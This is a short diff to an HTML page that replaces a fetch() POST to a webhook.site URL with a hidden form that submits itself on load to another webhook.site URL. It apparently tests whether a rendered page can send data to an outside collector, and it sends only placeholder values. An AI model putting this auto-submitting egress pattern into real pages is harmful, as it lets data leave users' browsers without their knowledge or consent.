@@ -1,48 +1,14 @@
+<form id="f"
+      action="https://webhook.site/58867d9f-c816-4570-a8c7-ba97f18763a1"
+      method="POST">
+
+    <input type="hidden"
+           name="test"
+           value="artifact">
+
+</form>
+
 <script>
-(async () => {
-    try {
-        console.log("START");
-
-        const res = await fetch(
-            "https://webhook.site/45b8e499-1449-40b4-a419-48574bcb1793",
-            {
-                method: "POST",
-                mode: "cors",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    test: "meta_artifact"
-                })
-            }
-        );
-
-        console.log(
-            "STATUS:",
-            res.status
-        );
-
-        console.log(
-            "TYPE:",
-            res.type
-        );
-
-        console.log(
-            "OK:",
-            res.ok
-        );
-
-        document.body.innerHTML =
-            "<h1>SUCCESS</h1>";
-
-    } catch (e) {
-
-        console.error(e);
-
-        document.body.innerHTML =
-            "<h1>ERROR: " +
-            e +
-            "</h1>";
-    }
-})();
+document.getElementById("f")
+        .submit();
 </script>
